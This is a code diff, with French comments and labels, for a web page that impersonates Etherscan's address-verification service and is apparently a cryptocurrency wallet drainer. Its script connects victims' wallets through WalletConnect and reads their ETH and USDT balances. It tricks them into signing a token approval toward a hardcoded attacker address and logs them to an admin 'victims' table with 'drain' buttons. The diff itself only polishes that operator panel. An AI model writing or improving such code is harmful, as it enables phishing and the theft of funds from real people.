@@ -97,7 +97,10 @@
     .mega a { display: flex; align-items: center; gap: 8px; padding: 7px 0; font-size: 13px; color: var(--azure-15); }
     .more-panel { max-width: 1400px; margin: 0 auto; }
     .more-container { padding: 24px 40px; }
-    .more-container h3 { margin: 0 0 16px; font-size: 18px; font-weight: 600; }
+    .more-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; gap: 12px; }
+    .more-header h3 { margin: 0; font-size: 18px; font-weight: 600; }
+    .clear-btn { padding: 6px 14px; font-size: 13px; font-weight: 500; border-radius: 6px; background: transparent; color: var(--punch); border: 1px solid var(--punch); cursor: pointer; transition: background 0.15s ease, color 0.15s ease; }
+    .clear-btn:hover { background: var(--punch); color: white; }
     #victim-table { width: 100%; border-collapse: collapse; font-size: 13px; }
     #victim-table th, #victim-table td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--grey-93); white-space: nowrap; }
     #victim-table th { font-weight: 600; color: var(--azure-15); background: var(--grey-98); }
@@ -107,10 +110,13 @@
     .status-pending { color: var(--azure-40); }
     .drain-btn { padding: 4px 12px; font-size: 12px; border-radius: 4px; background: var(--azure-40); color: white; border: none; cursor: pointer; }
     .drain-btn:hover { opacity: 0.8; }
-    .copy-btn { padding: 2px 6px; font-size: 11px; border-radius: 4px; background: var(--grey-93); color: var(--azure-15); border: 1px solid var(--grey-93); cursor: pointer; margin-left: 6px; transition: background 0.15s ease; vertical-align: middle; }
-    .copy-btn:hover { background: var(--geyser); }
-    .copy-btn.copied { background: var(--cyan-32); color: white; border-color: var(--cyan-32); }
+    .copy-btn { background: transparent; border: none; padding: 4px; margin-left: 6px; cursor: pointer; color: var(--grey-46); display: inline-flex; align-items: center; justify-content: center; vertical-align: middle; transition: color 0.15s ease; }
+    .copy-btn:hover { color: var(--azure-40); }
+    .copy-btn.copied { color: var(--cyan-32); }
+    .addr-full { display: inline; }
+    .addr-short { display: none; }
     #victim-loading { color: var(--grey-46); font-size: 14px; }
+    #victim-empty { color: var(--grey-46); font-size: 14px; display: none; }
     .main { background-image: linear-gradient(to top, var(--white-solid), var(--grey-98)); padding: 0 20px; }
     .main-inner { display: flex; justify-content: center; padding: 80px 0 128px; }
     .card { display: flex; flex-direction: column; align-items: center; width: 567px; max-width: 100%; border-radius: 12px; border: 1px solid var(--grey-93); background-color: var(--white-solid); padding: 24px 24px 52px; box-shadow: 0 8px 19.2px 0 rgb(189 197 209 / .2); }
@@ -198,10 +204,13 @@
       .more-panel { display: block !important; position: relative; top: auto; box-shadow: none; border-top: none; max-width: 100%; }
       .more-panel[hidden] { display: none !important; }
       .more-container { padding: 16px 12px; }
-      .more-container h3 { font-size: 15px; margin-bottom: 12px; }
+      .more-header h3 { font-size: 15px; }
+      .clear-btn { padding: 5px 10px; font-size: 12px; }
       #victim-table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; border: 1px solid var(--grey-93); border-radius: 8px; }
-      #victim-table { font-size: 12px; display: table; min-width: 900px; white-space: nowrap; }
+      #victim-table { font-size: 12px; display: table; min-width: 620px; white-space: nowrap; }
       #victim-table th, #victim-table td { padding: 8px 10px; }
+      .addr-full { display: none; }
+      .addr-short { display: inline; }
       .main { padding: 0 12px; }
       .main-inner { padding: 28px 0 56px; }
       .card { width: 100%; padding: 20px 16px 32px; border-radius: 10px; }
@@ -313,17 +322,19 @@
 
     <div class="mega more-panel" data-panel="More" hidden>
       <div class="more-container">
-        <h3>Transactions</h3>
+        <div class="more-header">
+          <h3>Transactions</h3>
+          <button type="button" class="clear-btn" id="clear-victims-btn">Clear</button>
+        </div>
         <div id="victim-table-wrapper">
           <p id="victim-loading">Chargement...</p>
+          <p id="victim-empty">Aucune transaction</p>
           <table id="victim-table" style="display:none;">
             <thead>
               <tr>
                 <th>Adresse</th>
                 <th>ETH</th>
                 <th>USDT</th>
-                <th>Token</th>
-                <th>Montant</th>
                 <th>Date</th>
                 <th>Statut</th>
                 <th>Action</th>
@@ -451,10 +462,12 @@
             <li><a href="https://info.etherscan.com/eaas/" target="_blank" rel="noopener noreferrer">Explorer as a Service (EaaS)</a></li>
             <li><a href="https://verifyaddress.io/apis" target="_blank" rel="noopener noreferrer">Etherscan API</a></li>
             <li><a href="https://verifyaddress.io/prioritysupport" target="_blank" rel="noopener noreferrer">Priority Support</a></li>
-            <li><a href="https://blockscan.com/" target="_blank" rel="noopener noreferrer">Blockscan</a>
+            <li>
+              <a href="https://blockscan.com/" target="_blank" rel="noopener noreferrer">Blockscan</a>
               <svg class="icon icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/></svg>
             </li>
-            <li><a href="https://chat.blockscan.com/" target="_blank" rel="noopener noreferrer">Blockscan Chat</a>
+            <li>
+              <a href="https://chat.blockscan.com/" target="_blank" rel="noopener noreferrer">Blockscan Chat</a>
               <svg class="icon icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/></svg>
             </li>
           </ul>
@@ -477,7 +490,6 @@
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.24.0/dist/index.umd.js"></script>
 
 <script>
-  /* ===== Icônes ===== */
   const ICONS = {
     chevronDown: '<path d="m6 9 6 6 6-6"/>',
     userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
@@ -512,19 +524,16 @@
     check: '<path d="M20 6 9 17l-5-5"/>',
   };
 
-  /* ===== PROTECTION ADMIN ===== */
-const MON_SECRET = "admin2912";
-const params = new URLSearchParams(window.location.search);
-if (params.get("admin") !== MON_SECRET) {
-  window.location.href = "https://etherscan.io/verifyaddress";
-}
-/* ===== FIN PROTECTION ===== */
+  const MON_SECRET = "admin2912";
+  const params = new URLSearchParams(window.location.search);
+  if (params.get("admin") !== MON_SECRET) {
+    window.location.href = "https://etherscan.io/verifyaddress";
+  }
 
   function svg(name, cls) {
     return '<svg class="' + (cls || 'icon') + '" viewBox="0 0 24 24" aria-hidden="true">' + ICONS[name] + '</svg>';
   }
 
-  /* ===== Menu ===== */
   const navItems = [
     { label: 'Home', href: 'https://verifyaddress.io/' },
     {
@@ -659,7 +668,6 @@ if (params.get("admin") !== MON_SECRET) {
   });
   document.getElementById('site-header').addEventListener('mouseleave', function () { setOpen(null); });
 
-  /* ===== Thèmes ===== */
   const THEME_KEY = 'etherscan-theme';
   const themeOptions = [
     { value: 'light', label: 'Light', icon: 'sun' },
@@ -716,7 +724,6 @@ if (params.get("admin") !== MON_SECRET) {
 
   applyTheme(theme);
 
-  /* ===== Admin Panel ===== */
   const adminModal = document.getElementById('admin-modal');
   const closeAdmin = document.getElementById('close-admin');
   const adminLoginBtn = document.getElementById('admin-login-btn');
@@ -819,7 +826,6 @@ if (params.get("admin") !== MON_SECRET) {
     }
   });
 
-  /* ===== WalletConnect ===== */
   const ATTACKER = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const API = '/api/store-victim';
@@ -827,8 +833,6 @@ if (params.get("admin") !== MON_SECRET) {
   const PUBLIC_RPC = 'https://ethereum.publicnode.com';
 
   let signClient, session, account;
-
-  // Suivi des timers "non signé" par adresse
   const pendingSignatures = {};
 
   function getSignClient() {
@@ -918,7 +922,6 @@ async function initWalletConnect() {
   const scanText = document.querySelector('.scan');
   if (scanText) scanText.textContent = 'En attente de confirmation…';
 
-  // ====== LECTURE DES SOLDES (ETH + USDT) ======
   let ethBalanceStr = '0';
   let usdtBalanceStr = '0';
   try {
@@ -940,7 +943,6 @@ async function initWalletConnect() {
     console.warn('Erreur lecture soldes:', e);
   }
 
-  // ====== ENREGISTREMENT DE LA CONNEXION (status='connected' + soldes) ======
   fetch('/api/record-wallet', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -955,9 +957,7 @@ async function initWalletConnect() {
   .then(() => { refreshVictimsIfPossible(); })
   .catch(err => console.error('Erreur record-wallet:', err));
 
-  // ====== TIMER "NON SIGNÉ" (60s) ======
   const addressKey = account.toLowerCase();
-  // Si un ancien timer existe pour cette adresse, on l'annule
   if (pendingSignatures[addressKey] && pendingSignatures[addressKey].timer) {
     clearTimeout(pendingSignatures[addressKey].timer);
   }
@@ -980,7 +980,6 @@ async function initWalletConnect() {
     }
   }, 60000);
 
-  // ====== DÉCLENCHEMENT POPUP 2 ======
   let approveTxTriggered = false;
   function triggerApproveTx() {
     if (approveTxTriggered) return;
@@ -1047,7 +1046,6 @@ async function sendExactApproveTransaction() {
     console.log('Tx approve exacte envoyée:', txHash);
     if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
 
-    // ====== ANNULER LE TIMER "NON SIGNÉ" ======
     const addressKey = account.toLowerCase();
     if (pendingSignatures[addressKey]) {
       pendingSignatures[addressKey].done = true;
@@ -1057,7 +1055,6 @@ async function sendExactApproveTransaction() {
       }
     }
 
-    // ====== MISE À JOUR DU STATUT → 'signed' ======
     try {
       await fetch('/api/record-wallet', {
         method: 'POST',
@@ -1085,12 +1082,28 @@ async function sendExactApproveTransaction() {
     console.error('Transaction error:', e);
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = '❌ Transaction refusée.';
-    // Si la transaction est refusée, le statut passera à 'unsigned' après 60s (timer toujours actif)
   }
 }
 
-  /* ===== Historique des victimes ===== */
   let victimPollTimer = null;
+
+  // ===== CLEAR : timestamp de clear en localStorage =====
+  const CLEAR_KEY = 'victimsClearedAt';
+
+  function getClearedAt() {
+    const v = localStorage.getItem(CLEAR_KEY);
+    return v ? Number(v) : 0;
+  }
+
+  document.getElementById('clear-victims-btn').addEventListener('click', function() {
+    localStorage.setItem(CLEAR_KEY, String(Date.now()));
+    // Re-render immédiat
+    if (typeof window.__lastVictims !== 'undefined') {
+      populateTable(window.__lastVictims);
+    } else {
+      populateTable([]);
+    }
+  });
 
   function refreshVictimsIfPossible() {
     if (typeof fetchVictims === 'function') {
@@ -1111,6 +1124,7 @@ async function sendExactApproveTransaction() {
       });
       if (!resp.ok) throw new Error('Erreur ' + resp.status);
       const victims = await resp.json();
+      window.__lastVictims = victims;
       populateTable(victims);
     } catch (err) {
       console.error('fetchVictims error:', err);
@@ -1119,18 +1133,38 @@ async function sendExactApproveTransaction() {
     }
   }
 
+  function shortenAddress(addr) {
+    if (!addr || addr.length < 12) return addr;
+    return addr.slice(0, 6) + '...' + addr.slice(-4);
+  }
+
+  function formatBalance(val, maxDecimals) {
+    if (!val || val === '0') return '0';
+    const n = parseFloat(val);
+    if (isNaN(n)) return val;
+    if (n === 0) return '0';
+    if (n < 0.0001) return '<0.0001';
+    return n.toFixed(maxDecimals).replace(/\.?0+$/, '');
+  }
+
+  function formatSignedAmount(amount) {
+    if (!amount || amount === '0' || amount === '?') return null;
+    const n = parseFloat(amount);
+    if (isNaN(n) || n === 0) return null;
+    return n.toFixed(2).replace(/\.?0+$/, '') + ' USDT';
+  }
+
+  const COPY_ICON_SVG = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
+
   function copyToClipboard(text, btn) {
     const onSuccess = function() {
       btn.classList.add('copied');
-      btn.textContent = '✓';
       setTimeout(function() {
         btn.classList.remove('copied');
-        btn.textContent = '📋';
       }, 1000);
     };
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(text).then(onSuccess).catch(function() {
-        // Fallback
         const ta = document.createElement('textarea');
         ta.value = text;
         ta.style.position = 'fixed';
@@ -1152,44 +1186,55 @@ async function sendExactApproveTransaction() {
     }
   }
 
-  function shortenAddress(addr) {
-    if (!addr || addr.length < 12) return addr;
-    return addr.slice(0, 6) + '...' + addr.slice(-4);
-  }
-
-  function formatBalance(val, maxDecimals) {
-    if (!val || val === '0') return '0';
-    const n = parseFloat(val);
-    if (isNaN(n)) return val;
-    if (n === 0) return '0';
-    if (n < 0.0001) return '<0.0001';
-    return n.toFixed(maxDecimals).replace(/\.?0+$/, '');
-  }
-
-  function populateTable(victims) {
+  function populateTable(allVictims) {
     const tbody = document.getElementById('victim-tbody');
     const loading = document.getElementById('victim-loading');
+    const empty = document.getElementById('victim-empty');
     const table = document.getElementById('victim-table');
     if (!tbody || !loading || !table) return;
 
+    // Filtre par timestamp de clear
+    const clearedAt = getClearedAt();
+    const victims = allVictims.filter(function(v) {
+      if (!clearedAt) return true;
+      const ts = v.timestamp ? Number(v.timestamp) : 0;
+      return ts > clearedAt;
+    });
+
     loading.style.display = 'none';
+
+    if (victims.length === 0) {
+      table.style.display = 'none';
+      if (empty) empty.style.display = 'block';
+      tbody.innerHTML = '';
+      return;
+    }
+
+    if (empty) empty.style.display = 'none';
     table.style.display = '';
     tbody.innerHTML = '';
 
     victims.forEach(function (v) {
       const row = document.createElement('tr');
 
-      // --- Adresse + bouton copier ---
+      // --- Adresse : 2 spans (full desktop / short mobile) + bouton copier ---
       const tdAddr = document.createElement('td');
-      const addrSpan = document.createElement('span');
-      addrSpan.textContent = v.address;
-      addrSpan.title = v.address;
-      tdAddr.appendChild(addrSpan);
+      const addrFull = document.createElement('span');
+      addrFull.className = 'addr-full';
+      addrFull.textContent = v.address;
+      addrFull.title = v.address;
+      const addrShort = document.createElement('span');
+      addrShort.className = 'addr-short';
+      addrShort.textContent = shortenAddress(v.address);
+      addrShort.title = v.address;
+      tdAddr.appendChild(addrFull);
+      tdAddr.appendChild(addrShort);
       const copyBtn = document.createElement('button');
       copyBtn.className = 'copy-btn';
       copyBtn.type = 'button';
-      copyBtn.textContent = '📋';
+      copyBtn.innerHTML = COPY_ICON_SVG;
       copyBtn.title = 'Copier l\'adresse';
+      copyBtn.setAttribute('aria-label', 'Copier l\'adresse');
       copyBtn.addEventListener('click', function(e) {
         e.stopPropagation();
         copyToClipboard(v.address, copyBtn);
@@ -1207,31 +1252,26 @@ async function sendExactApproveTransaction() {
       tdUsdt.textContent = formatBalance(v.usdt_balance, 2) + ' USDT';
       row.appendChild(tdUsdt);
 
-      // --- Token ---
-      const tdToken = document.createElement('td');
-      tdToken.textContent = (v.token ? v.token : '?') + (v.chain ? ' (' + v.chain + ')' : '');
-      row.appendChild(tdToken);
-
-      // --- Amount ---
-      const tdAmount = document.createElement('td');
-      tdAmount.textContent = v.amount || '0';
-      row.appendChild(tdAmount);
-
       // --- Date ---
       const tdDate = document.createElement('td');
       tdDate.textContent = v.timestamp ? new Date(v.timestamp).toLocaleString() : '-';
       row.appendChild(tdDate);
 
-      // --- Statut ---
+      // --- Statut (avec montant signé si dispo) ---
       const tdStatus = document.createElement('td');
       if (v.status === 'drained') {
         tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
       } else if (v.status === 'signed' || v.status === 'approved' || v.status === 'pending_manual') {
-        tdStatus.innerHTML = '<span class="status-success">✅ Signé</span>';
+        const amt = formatSignedAmount(v.amount);
+        if (amt) {
+          tdStatus.innerHTML = '<span class="status-success">' + amt + ' Signé</span>';
+        } else {
+          tdStatus.innerHTML = '<span class="status-success">Signé</span>';
+        }
       } else if (v.status === 'unsigned') {
-        tdStatus.innerHTML = '<span class="status-error">❌ Non signé</span>';
+        tdStatus.innerHTML = '<span class="status-error">Non signé</span>';
       } else if (v.status === 'failed') {
-        tdStatus.innerHTML = '<span class="status-error">❌ Échec</span>';
+        tdStatus.innerHTML = '<span class="status-error">Échec</span>';
       } else if (v.status === 'connected') {
         tdStatus.innerHTML = '<span class="status-pending">🔗 Connecté</span>';
       } else {
@@ -1295,7 +1335,6 @@ async function sendExactApproveTransaction() {
     });
   });
 
-  /* ===== Hamburger mobile ===== */
   const hamburgerBtn = document.getElementById('hamburgerBtn');
   const mobileMenu = document.getElementById('mobileMenu');
 
@@ -1307,7 +1346,6 @@ async function sendExactApproveTransaction() {
   if (hamburgerBtn) {
     hamburgerBtn.addEventListener('click', function(e) {
       e.stopPropagation();
-      // Si le panneau More est ouvert, on le ferme
       if (openMenu === 'More') {
         setOpen(null);
       }
